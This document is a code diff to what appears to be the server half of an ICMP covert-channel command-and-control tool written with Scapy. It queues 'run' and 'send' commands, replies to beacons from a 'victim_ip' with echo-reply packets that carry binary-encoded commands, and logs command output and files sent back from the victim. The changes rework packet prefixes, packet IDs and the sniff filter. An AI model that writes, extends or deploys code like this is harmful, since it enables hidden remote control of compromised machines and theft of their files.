@@ -14,21 +14,23 @@ def commands_input():
             commands_que = {key: value}
             print(commands_que)
 
-def send_command(ip_adr):
+def send_command(ip_adr,id_type):
     global commands_que
     if not commands_que:
         return
     print("commands_que:")
     print(type(commands_que))
-    id_type = next(iter(commands_que))
-    print("id type is: " + id_type)
+    prefix = next(iter(commands_que))
+    print("prefix is: " + prefix)
     command_name = commands_que[id_type]
     print("command is: " + command_name)
-    if id_type == "run":
-        id_type = RUN
-    elif id_type == "send":
-        id_type = FILE
-    pkt_send(dest=ip_adr,data=command_name,icmp_type="echo-reply",id_packet=id_type)
+    if prefix == "run":
+        prefix = RUN
+    elif prefix == "send":
+        prefix = FILE
+    bin_command = str_to_binary(command_name)
+    pkt_no_data = IP(dst=ip_adr)/ICMP(type="echo-reply",id=id_type)
+    pkt_send(pkt_no_data,prefix + bin_command)
     commands_que = ""
         
     
@@ -36,30 +38,31 @@ def parse_packet(packet):
     global opened_fd
     if Raw in packet:
         victim_ip = packet[IP].src
-        type_packet = check_type(packet)
+        id_packet = get_packet_id(packet)
+        prefix_packet = check_prefix(packet)     
         data_recieved = extract_data(packet)
-        if type_packet == BEACON:
-            send_command(victim_ip)                 # check if there is a command in the queue and send if there is
+        if prefix_packet == BEACON:
+            send_command(victim_ip,id_packet)                 # check if there is a command in the queue and send if there is
       
-        elif type_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
+        elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
             opened_fd = open_file(LOG_OUTPUT)
             write_to_file(opened_fd,data_recieved)  # write only the name of the command the the output commands log
         
-        elif type_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
+        elif prefix_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
             file_name = os.path.basename(data_recieved)
             opened_fd = open_file(file_name)
             
-        elif type_packet == IN_TRANSFER:
+        elif prefix_packet == IN_TRANSFER:
             write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
             
-        elif type_packet == EF:                     # a packet that tells the server that client has finished transferring
+        elif prefix_packet == EF:                     # a packet that tells the server that client has finished transferring
             close_file(opened_fd)
             opened_fd = ""
             print("transer complete")
             
                         
 def server_listen():
-    sniff_pkt(ICMP_REQUEST + " or (((ip[6:2] > 0) or (ip[7] > 0)) and (not ip[6] = 64))",parse_packet)
+    sniff_pkt(ICMP_REQUEST,parse_packet)
     
 
 signal.signal(signal.SIGINT, signal_handler)
